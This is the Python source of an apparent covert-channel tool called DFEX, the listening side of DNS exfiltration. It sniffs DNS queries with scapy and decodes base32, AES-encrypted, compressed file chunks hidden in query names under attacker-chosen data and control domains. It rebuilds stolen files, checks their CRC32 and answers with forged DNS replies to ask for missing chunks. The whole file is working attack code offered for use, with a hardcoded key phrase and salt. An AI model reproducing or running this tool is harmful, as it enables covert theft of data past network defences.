#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import argparse
import binascii
import re
import time
import zlib
import pyaes
import pyscrypt
import base64
import threading
import netifaces as ni
from netifaces import AF_INET
from random import randint
from pyfiglet import Figlet
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.0"

# Config
DEBUG = False
PHRASE = b'Waaaaa! awesome :)'
SALT = b'salgruesa'
SEED = '200'
exfiles = {}
iface = ''


# Classes
class FileHandler(threading.Thread):
    """
    Class to look dict and assemble file chunks
    Request re-transmission if need it
    It run every 5 seconds to check if any file to process
    """
    def __init__(self, exfiles):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.exfiles = exfiles
        self.TRANSFER = []

    def run(self):
        while not self.stoprequest.isSet():
            time.sleep(5)
            # look for len of chunks exfiles(fileid) == pkttotals
            for k,v in self.exfiles.items():
                # for each FILEID (k)
                if k not in self.TRANSFER:
                    chunk_len = len(exfiles[k]['chunk'])
                    pkt_total = exfiles[k]['pkttotal']
                    if chunk_len == pkt_total:
                        real_name = decrypt(decoder(exfiles[k]['filecrypt'])).decode('utf-8')
                        # sort and join chunks (str) into bytes
                        filechunk = []
                        for key, value in sorted(exfiles[k]['chunk'].items(), key = operator.itemgetter(0)):
                            filechunk.append(value)
                        filefull = ''.join(filechunk)
                        deco = decoder(filefull)
                        dec = decrypt(deco)
                        decompress(dec, real_name)
                        real_crc = crc(real_name)
                        if real_crc == exfiles[k]['crc']:
                            print('INFO: File ID: ' + k + ' (filename: ' + real_name + ')')
                            print('INFO: Fiel ID: ' + k + ' (CRC32: ' + real_crc + ')')
                            self.TRANSFER.append(k)

    def join(self):
        self.stoprequest.set()


# Functions
def crc(filename):
    # open file as byte and return crc32 in hex (8 char)
    fd = open(filename,'rb').read()
    b = (binascii.crc32(fd) & 0xFFFFFFFF)
    return '{:x}'.format(b)

def decrypt(bytestream):
    # Hash passphrase + salt and decrypt using AES-CTR mode (return bytestream)
    key = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
    aes = pyaes.AESModeOfOperationCTR(key)
    return aes.decrypt(bytestream)

def decompress(bytestream, filename):
    # decompress bytestream and write filename
    with open(filename, 'wb') as sfile:
        sfile.write(zlib.decompress(bytestream))

def decoder(string):
    # correct pad, make uppercase and bytes
    # decode base32 and return bytestream
    pad = int(string[0])
    string = string[1:]
    if pad != 0:
        string = string + pad * '='
    bytestr = string.upper().encode()
    return base64.b32decode(bytestr)

def missing(chunk, pkttotal):
    chunk_set = set()
    for key, value in chunk.items():
        chunk_set.add(key)
    return list(set(range(1,pkttotal+1)).difference(chunk_set))

def senddns(fileid, seq, pkt):
    # Craft DNS packet and send query
    first = '{:04x}'.format(seq)[:2]
    second = '{:04x}'.format(seq)[2:]
    answer = SEED + '.' + str(int(fileid, 16)) + '.' + str(int(first, 16)) + '.' + str(int(second, 16))
    dnspkt = (Ether() /
            IP(ihl=5, src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
            DNS(qr=1, rd=1, ra=1, ancount=1, qd=DNSQR(qtype='A')))
    dnspkt[DNS].qd = pkt[DNS].qd
    dnspkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname.decode('utf-8'), type='A', rclass='IN', ttl=randint(3000, 3600), rdata=answer)
    dnspkt[IP].id = randint(0, 0xFFFF)
    dnspkt[DNS].id = pkt[DNS].id
    sendp(dnspkt, iface=iface, verbose=0)
    time.sleep(5)

def pkt_callback(pkt):
    if pkt.haslayer(DNS):
        qname = pkt[DNS].qd[DNSQR].qname.decode()
        chunk = qname.split('.')[0]
        fileid = chunk[:2]
        if any(qname.replace(chunk + '.', '')[:-1] in d for d in DATA):
            if chunk[2:6] == '0000':
                # query_fdname = self.fileid + '0000' + fdcrypt
                exfiles[fileid]['filecrypt'] = exfiles[fileid]['filecrypt'] + chunk[6:]
            else:
                # query_data = self.fileid + '{:04x}'.format(x) + chunks[x]
                seq = int(chunk[2:6], 16)
                exfiles[fileid]['chunk'][seq] = chunk[6:]

        elif any(qname.replace(chunk + '.', '')[:-1] in c for c in CONTROL):
            if (len(chunk) != 2) and (len(chunk) != 6):
                # first control packet
                # fileid + crcfd + '{:04x}'.format(pkttotal)
                exfiles[fileid] = {}
                exfiles[fileid]['filecrypt'] = ''
                exfiles[fileid]['chunk'] = {}
                exfiles[fileid]['pkttotal'] = int(chunk[-4:], 16)
                exfiles[fileid]['crc'] = chunk[2:10]
            else:
                # only if dict has pending True build DNS ANS for chuck missing
                if exfiles[fileid]['pkttotal'] != len(exfiles[fileid]['chunk']):
                    # re-transmission packet
                    seqmiss = missing(exfiles[fileid]['chunk'], exfiles[fileid]['pkttotal'])
                    print('INFO: Chunk ' + ''.join(str(seqmiss)) + ' missing for File ID: ' + fileid)
                    senddns(fileid, seqmiss[0], pkt)


def parsingopt():
    f = Figlet(font='standard')
    print(f.renderText('DFEX'))
    print('Author: ' + __author__)
    print('Version: ' + __version__ + '\n')
    parser = argparse.ArgumentParser(add_help=True)
    command_group_dat = parser.add_mutually_exclusive_group(required=True)
    command_group_ctl = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('-v', dest='verbose', action='store_true', help='Enable debugging')
    parser.add_argument('-i', dest='nic', required=True, metavar='eth0', help='Interface')
    command_group_dat.add_argument('-d', dest='datdomain', metavar='dfex.dat.dom', help='Data domain')
    command_group_dat.add_argument('-D', dest='datdomainfd', metavar='data.txt', help='File with data domain (1 per line)')
    command_group_ctl.add_argument('-c', dest='ctldomain', metavar='dfex.ctrl.dom', help='Control domain')
    command_group_ctl.add_argument('-C', dest='ctldomainfd', metavar='control.txt', help='File with control domain (1 per line)')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except(IOError):
            parser.error(str(IOError))
    else:
        parser.print_help()
        sys.exit(1)


# Main Funtion
def main():
    global DEBUG
    global DATA
    global CONTROL
    global exfiles
    global iface

    options = parsingopt()

    if options.verbose:
        DEBUG = True

    if options.nic in ni.interfaces():
        iface = options.nic
    else:
        print('ERROR: interface not valid')
        sys.exit(1)

    if options.datdomain:
        DATA = [options.datdomain]
        if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', options.datdomain):
            print('ERROR: Data domain not valid')
            sys.exit(1)

    if options.datdomainfd:
        try:
            with open(options.datdomainfd, 'r') as sfile:
                DATA = sfile.read().split()
            for x in DATA:
                if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', x):
                    print('ERROR: Data domain not valid ',x)
                    sys.exit(1)
        except(OSError):
            print('ERROR: Can\'t read file',options.datdomainfd)
            sys.exit(1)

    if options.ctldomain:
        CONTROL = [options.ctldomain]
        if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', options.ctldomain):
            print('ERROR: Control domain not valid')
            sys.exit(1)

    if options.ctldomainfd:
        try:
            with open(options.ctldomainfd, 'r') as sfile:
                CONTROL = sfile.read().split()
            for x in CONTROL:
                if not re.search(r'^(?=.{4,255}$)([a-zA-Z0-9][a-zA-Z0-9-]{,61}[a-zA-Z0-9]\.)+[a-zA-Z0-9]{2,5}$', x):
                    print('ERROR: Control domain not valid ',x)
                    sys.exit(1)
        except(OSError):
            print('ERROR: Can\'t read file',options.ctldomainfd)
            sys.exit(1)

    # New Thread daemon looking into exfiles for completed files
    fdh = FileHandler(exfiles)
    fdh.start()

    srcipreal = ni.ifaddresses(iface)[AF_INET][0]['addr']
    if DEBUG:
        print('DEBUG: realip :',srcipreal)
        print('DEBUG: interface :',iface)
    print('INFO: Listening....')

    # Main loop
    while True:
        try:
            sniff(iface=iface, prn=pkt_callback, filter="udp port 53 and not src " + srcipreal, store=0)
            print('\nSayonara')
            fdh.join()
            sys.exit(0)
        except KeyboardInterrupt:
            sys.exit(0)


# Call main
if __name__ == "__main__":
    main()
